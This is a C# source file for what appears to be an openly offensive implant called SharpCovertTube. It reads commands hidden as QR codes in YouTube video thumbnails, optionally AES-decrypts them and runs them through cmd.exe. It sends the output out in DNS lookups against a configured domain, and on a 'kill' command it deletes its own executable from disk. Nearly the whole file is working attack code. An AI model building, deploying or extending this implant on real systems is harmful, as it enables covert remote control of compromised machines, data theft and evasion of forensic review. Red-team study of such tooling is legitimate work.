using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Text;
using System.Drawing;
using System.Diagnostics;
using System.Collections.Generic;
using SharpCovertTube.QRCodeDecoder;
using System.Security.Cryptography;
using System.Runtime.InteropServices;


namespace SharpCovertTube
{
    internal class Program
    {
        /* Configuration values */
        // Channel ID (mandatory!!!). Get it from: https://www.youtube.com/account_advanced
        public const string channel_id = "";
        // API Key (mandatory!!!). Get it from: https://console.cloud.google.com/apis/credentials
        public const string api_key = "";
        // AES Key used for payload encryption
        public const string payload_aes_key = "0000000000000000";
        // IV Key used for payload encryption
        public const string payload_aes_iv = "0000000000000000";
        // Period between every check of the Youtube channel. Default is 10 minutes to avoid exceeding api quota
        public const int seconds_delay = 600;
        // Show debug messages in console or not
        public const bool debug_console = true;
        // Write debug messages in log file or not
        public const bool log_to_file = true;
        // Log file 
        public const string log_file = "c:\\temp\\.sharpcoverttube.log";
        // Exfiltrate command responses through DNS or not
        public const bool dns_exfiltration = true;
        // DNS hostname used for DNS exfiltration
        public const string dns_hostname = ".test.org";

        [DllImport("wininet.dll")] private extern static bool InternetGetConnectedState(out int Description, int ReservedValue);
        [DllImport("kernel32.dll", SetLastError = true)] private static extern IntPtr CreateFileW([MarshalAs(UnmanagedType.LPWStr)] string lpFileName, uint dwDesiredAccess, uint dwShareMode, uint lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, uint hTemplateFile);
        [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)] static extern Int32 WSAGetLastError();
        [DllImport("Kernel32.dll", SetLastError = true)] private static extern int SetFileInformationByHandle(IntPtr hFile, FileInformationClass FileInformationClass, IntPtr FileInformation, Int32 dwBufferSize);
        [DllImport("Kernel32.dll", SetLastError = true)] private static extern bool CloseHandle(IntPtr handle);
        [DllImport("kernel32.dll", SetLastError = true)][PreserveSig] public static extern uint GetModuleFileName([In] IntPtr hModule, [Out] StringBuilder lpFilename, [In][MarshalAs(UnmanagedType.U4)] int nSize);
        
        enum FileInformationClass : int { FileBasicInfo = 0, FileStandardInfo = 1, FileNameInfo = 2, FileRenameInfo = 3, FileDispositionInfo = 4, FileAllocationInfo = 5, FileEndOfFileInfo = 6, FileStreamInfo = 7, FileCompressionInfo = 8, FileAttributeTagInfo = 9, FileIdBothDirectoryInfo = 10, FileIdBothDirectoryRestartInfo = 11, FileIoPriorityHintInfo = 12, FileRemoteProtocolInfo = 13, FileFullDirectoryInfo = 14, FileFullDirectoryRestartInfo = 15, FileStorageInfo = 16, FileAlignmentInfo = 17, FileIdInfo = 18, FileIdExtdDirectoryInfo = 19, FileIdExtdDirectoryRestartInfo = 20, }
        
        [StructLayout(LayoutKind.Sequential)] public unsafe struct filerenameinfo_struct { public bool ReplaceIfExists; public IntPtr RootDirectory; public uint FileNameLength; public fixed byte filename[255]; }
        [StructLayout(LayoutKind.Sequential)] public struct filedispositioninfo_struct { public bool DeleteFile; }
        
        const uint DELETE = (uint)0x00010000L;
        const uint SYNCHRONIZE = (uint)0x00100000L;
        const uint FILE_SHARE_READ = 0x00000001;
        const uint OPEN_EXISTING = 3;
        const int MAX_PATH = 256;


        static void LogShow(string msg) {
            msg = "[" + DateTime.Now.ToString("HH:mm:ss").ToString() + "]  " +  msg;
            if (debug_console) { 
                Console.WriteLine(msg);
            }
            if (log_to_file) {
                using (StreamWriter writer = File.AppendText(log_file))
                {
                    writer.WriteLine(msg);
                }
            }
        }


        static string ByteArrayToStr(byte[] DataArray)
        {
            Decoder decoder = Encoding.UTF8.GetDecoder();
            int CharCount = decoder.GetCharCount(DataArray, 0, DataArray.Length);
            char[] CharArray = new char[CharCount];
            decoder.GetChars(DataArray, 0, DataArray.Length, CharArray, 0);
            return new string(CharArray);
        }


        // Source: https://github.com/Stefangansevles/QR-Capture
        static string DecodeQR(Bitmap QRCodeInputImage)
        {
            QRDecoder decoder = new QRDecoder();
            byte[][] DataByteArray = decoder.ImageDecoder(QRCodeInputImage);
            if (DataByteArray == null)
            {
                Console.WriteLine("DataByteArray is null");
                return "";
            }
            string code = ByteArrayToStr(DataByteArray[0]);
            return code;
        }
        

        static string ReadQR(string thumbnail_url)
        {
            var client = new WebClient();
            var stream = client.OpenRead(thumbnail_url);
            if (stream == null) return "";
            Bitmap bitmap_from_image = new Bitmap(stream);
            string decoded_cmd = DecodeQR(bitmap_from_image);
            return decoded_cmd;
        }


        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }


        public static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }


        static string OrdinaryCmd(string command) {
            string output = "";
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c " + command;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                StreamReader reader2 = process.StandardOutput;
                output = reader2.ReadToEnd();
                process.WaitForExit();
            }
            return output;
        }


        static void DeleteAndKill() {
            StringBuilder fname = new System.Text.StringBuilder(MAX_PATH);
            GetModuleFileName(IntPtr.Zero, fname, MAX_PATH);
            string filename = fname.ToString();
            string new_name = ":Random";

            // Handle to current file
            IntPtr hFile = CreateFileW(filename, DELETE | SYNCHRONIZE, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
            int last_error = WSAGetLastError();
            if (last_error != 0 || hFile == IntPtr.Zero)
            {
                System.Environment.Exit(0);
            }

            // Creating FILE_RENAME_INFO struct
            filerenameinfo_struct fri = new filerenameinfo_struct();
            fri.ReplaceIfExists = true;
            fri.RootDirectory = IntPtr.Zero;
            uint FileNameLength = (uint)(new_name.Length * 2);
            fri.FileNameLength = FileNameLength;
            int size = Marshal.SizeOf(typeof(filerenameinfo_struct)) + (new_name.Length + 1) * 2;

            IntPtr fri_addr = IntPtr.Zero;
            unsafe
            {
                // Get Address of FILE_RENAME_INFO struct
                filerenameinfo_struct* pfri = &fri;
                fri_addr = (IntPtr)pfri;

                // Copy new file name (bytes) to filename member in FILE_RENAME_INFO struct
                byte* p = fri.filename;
                byte[] filename_arr = Encoding.Unicode.GetBytes(new_name);
                foreach (byte b in filename_arr)
                {
                    *p = b;
                    p += 1;
                }
            }
            // Rename file calling SetFileInformationByHandle
            int sfibh_res = SetFileInformationByHandle(hFile, FileInformationClass.FileRenameInfo, fri_addr, size);
            last_error = WSAGetLastError();
            if (sfibh_res == 0)
            {
                System.Environment.Exit(0);
            }

            // Close handle to finally rename file
            bool ch_res = CloseHandle(hFile);

            // Handle to current file
            IntPtr hFile2 = CreateFileW(filename, DELETE | SYNCHRONIZE, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
            last_error = WSAGetLastError();
            if (last_error != 0 || hFile == IntPtr.Zero)
            {
                System.Environment.Exit(0);
            }

            // Creating FILE_DISPOSITION_INFO struct
            filedispositioninfo_struct fdi = new filedispositioninfo_struct();
            fdi.DeleteFile = true;
            IntPtr fdi_addr = IntPtr.Zero;
            int size_fdi = Marshal.SizeOf(typeof(filedispositioninfo_struct));

            unsafe
            {
                // Get Address of FILE_DISPOSITION_INFO struct
                filedispositioninfo_struct* pfdi = &fdi;
                fdi_addr = (IntPtr)pfdi;
            }

            // Rename file calling SetFileInformationByHandle
            int sfibh_res2 = SetFileInformationByHandle(hFile2, FileInformationClass.FileDispositionInfo, fdi_addr, size_fdi);
            last_error = WSAGetLastError();
            if (sfibh_res == 0 || last_error != 0)
            {
                System.Environment.Exit(0);
            }

            // Close handle to finally delete file
            bool ch_res2 = CloseHandle(hFile2);
            
            // Exiting...
            System.Environment.Exit(0);
        }


        // Source: MSDN
        static string ExecuteCommand(string command)
        {
            if (command == "kill")
            {
                DeleteAndKill();
                return "";
            }
            else {
                string output = OrdinaryCmd(command);
                return output;
            }    
        }


        // Source: https://stackoverflow.com/questions/4133377/splitting-a-string-number-every-nth-character-number
        static IEnumerable<String> SplitInParts(String s, Int32 partLength)
        {
            if (s == null)
            {
                throw new ArgumentNullException(nameof(s));
            }
            if (partLength <= 0)
            {
                throw new ArgumentException("Part length has to be positive.", nameof(partLength));
            }
            for (var i = 0; i < s.Length; i += partLength)
                yield return s.Substring(i, Math.Min(partLength, s.Length - i));
        }


        static void DNSExfil(string response_cmd) {
            // Base64-encode the response
            if (response_cmd == "")
            {
                response_cmd = "null";
            }
            string base64_response_cmd = Base64Encode(response_cmd);
            LogShow("Base64-encoded response:\t\t"+ base64_response_cmd);
            int max_size = 50; // 255 - dns_hostname.Length - 1; <-- These sizes generate errors and I dont know why
            if (base64_response_cmd.Length > max_size) {
                LogShow("Splitting encoded response in chunks of "+ max_size + " characters");
            }
            var parts = SplitInParts(base64_response_cmd, max_size);
            foreach (var response_portion in parts)
            {
                // DNS lookup
                try
                {
                    string exfil_hostname = response_portion + dns_hostname;
                    exfil_hostname = exfil_hostname.Replace("=", "");
                    LogShow("DNS lookup against:\t\t\t" + exfil_hostname);
                    Dns.GetHostAddresses(exfil_hostname);
                }
                catch (Exception e)
                {
                    if (e.GetType().ToString() != "System.Net.Sockets.SocketException")
                    {
                        LogShow("[-] Exception: " + e.ToString());
                    }
                }
            }
        }


        static string TryDecrypt(string payload)
        {
            try {
                // Base64-decode
                string base64_decoded = Base64Decode(payload);
                string decrypted_cmd = DecryptStringFromBytes(base64_decoded, Encoding.ASCII.GetBytes(payload_aes_key), Encoding.ASCII.GetBytes(payload_aes_iv));
                LogShow("Payload was AES-encrypted");
                return decrypted_cmd;
            }
            catch {
                LogShow("Payload was not AES-encrypted");
                return payload;
            }
        }


        static void ReadVideo(string video_id, string channel_url)
        {
            LogShow("Reading new video with ID: \t\t" + video_id);
            string thumbnail_url = "https://i.ytimg.com/vi/" + video_id + "/hqdefault.jpg";
            
            // Read QR
            string qr_decoded_cmd = ReadQR(thumbnail_url);
            LogShow("Value decoded from QR:\t\t" + qr_decoded_cmd);

            // Decrypt in case it is AES-encrypted
            string decrypted_cmd = TryDecrypt(qr_decoded_cmd);
            LogShow("Value after trying to AES-decrypt:\t" + decrypted_cmd);

            // Execute command
            string response_cmd = ExecuteCommand(decrypted_cmd);
            response_cmd.Trim();
            LogShow("Response from command:\t\t" + response_cmd);

            // Exfiltrate
            if (dns_exfiltration) {
                DNSExfil(response_cmd);
            }
        }


        static string getRequest(string url) {
            WebRequest wrGETURL = WebRequest.Create(url);
            Stream objStream = wrGETURL.GetResponse().GetResponseStream();
            StreamReader objReader = new StreamReader(objStream);
            string json_response_str = "";
            string sLine = "";
            while (sLine != null)
            {
                json_response_str += sLine;
                sLine = objReader.ReadLine();
            }
            return json_response_str;
        }


        static List<string> GetVideoIds(string channel_url)
        {
            List<string> VideoIds = new List<string>();
            string json_response_str = getRequest(channel_url);

            var deserialized = JSONSerializer<APIInfo>.DeSerialize(json_response_str);
            foreach (Item item in deserialized.items)
            {
                VideoIds.Add(item.id.videoId);
            }

            return VideoIds;
        }


        static void MonitorChannel(string channel_url, int seconds_delay) {
            // Initial videos
            List<string> Initial_VideoIds = GetVideoIds(channel_url);
            int number_of_videos = Initial_VideoIds.Count;
            foreach (string value in Initial_VideoIds)
            {
                LogShow("Video already uploaded with ID " + value);
            }

            while (true)
            {
                // Sleep
                LogShow("Sleeping "+ seconds_delay + " seconds");
                System.Threading.Thread.Sleep(1000 * seconds_delay);

                // Get list of videos
                List<string> VideoIds = GetVideoIds(channel_url);
                var firstNotSecond = VideoIds.Except(Initial_VideoIds);
                // If new videos -> Read
                if (firstNotSecond != null && firstNotSecond.Any()) {
                    LogShow("New video(s) uploaded!");

                    foreach (var video_id in firstNotSecond)
                    {
                        ReadVideo(video_id, channel_url);
                    }

                    number_of_videos = VideoIds.Count;
                    Initial_VideoIds = VideoIds;
                }
                // No new videos
                else
                {
                    LogShow("No new videos... Total number of uploaded videos: \t" + VideoIds.Count);
                }
            }
        }

    
        // AES Decrypt
        static string DecryptStringFromBytes(String cipherTextEncoded, byte[] Key, byte[] IV)
        {
            byte[] cipherText = Convert.FromBase64String(cipherTextEncoded);
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");
            string plaintext = null;
            using (RijndaelManaged rijAlg = new RijndaelManaged())
            {
                rijAlg.Key = Key;
                rijAlg.IV = IV;
                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }
            }
            return plaintext;
        }


        public static bool IsConnectedToInternet()
        {
            int Desc;
            return InternetGetConnectedState(out Desc, 0);
        }


        static void Main(string[] args)
        {
            if (channel_id == "" || api_key == "") {
                LogShow("It is necessary to fill the channel_id and api_key values before running the program.");
                System.Environment.Exit(0);
            }
            while (!IsConnectedToInternet())
            {
                System.Threading.Thread.Sleep(1000 * 60);
            }
            LogShow("Monitoring Youtube channel with id " + channel_id);
            string channel_url = "https://www.googleapis.com/youtube/v3/search?" + "part=snippet&channelId=" + channel_id + "&maxResults=100&order=date&type=video&key=" + api_key;
            // LogShow("[+] URL to test for file upload: {0}", channel_url);
            MonitorChannel(channel_url, seconds_delay);
        }
    }
}